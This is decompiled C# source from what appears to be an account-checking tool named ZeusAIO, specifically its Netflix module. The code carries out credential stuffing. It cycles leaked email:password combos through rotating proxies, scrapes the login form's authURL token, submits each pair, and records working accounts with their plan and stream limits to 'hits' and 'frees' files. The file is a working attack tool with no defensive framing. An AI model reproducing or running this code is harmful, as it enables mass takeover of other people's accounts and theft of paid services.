// Decompiled with JetBrains decompiler
// Type: Netflix.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Netflix
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";
              httpRequest.KeepAliveTimeout = 5000;
              httpRequest.ConnectTimeout = 5000;
              httpRequest.ReadWriteTimeout = 5000;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.UseCookies = true;
              httpRequest.Cookies = (CookieStorage) null;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source1 = httpRequest.Get("https://www.netflix.com/al/login").ToString();
              if (source1.Contains("name=\"authURL\" value=\""))
              {
                string str1 = Check.Parse(source1, "name=\"authURL\" value=\"", "\"/><input type=\"hidden");
                string str2 = "userLoginId=" + s[0] + "&password=" + s[1] + "&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=" + str1 + "&nextPage=&showPassword=&countryCode=%2B355&countryIsoCode=AL&recaptchaResponseToken=&recaptchaError=LOAD_TIMED_OUT";
                string str3 = httpRequest.Post("https://www.netflix.com/al/login", str2, "application/x-www-form-urlencoded").ToString();
                if (!str3.Contains("Incorrect password") && !str3.Contains("Sorry, we can't find an account with this email address") && !str3.Contains("with this email address"))
                {
                  if (str3.Contains("ctaButtonLogout\":\"Sign\\x20Out\",\"") || str3.Contains("ctaButtonLogout\":"))
                  {
                    string source2 = httpRequest.Get("https://www.netflix.com/YourAccount?").ToString();
                    string str4 = Check.Parse(source2, "\"currentPlanName\":\"", "\"").Replace("Bu00E1sico", "Basic").Replace("u57FAu672C", "Basic").Replace("Τυπικό", "Basic");
                    string str5 = Check.Parse(source2, "\"maxStreams\":", ",");
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - NETFLIX] " + s[0] + ":" + s[1] + " | Plan: " + str4 + " | MaxStreams: " + str5, Color.Green);
                    Export.AsResult("/Netflix_hits", s[0] + ":" + s[1] + " | Plan: " + str4 + " | MaxStreams: " + str5);
                    return false;
                  }
                  if (str3.Contains("Choose your plan"))
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - NETFLIX] " + s[0] + ":" + s[1], Color.OrangeRed);
                    Export.AsResult("/Netflix_frees", s[0] + ":" + s[1]);
                    return false;
                  }
                  break;
                }
              }
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
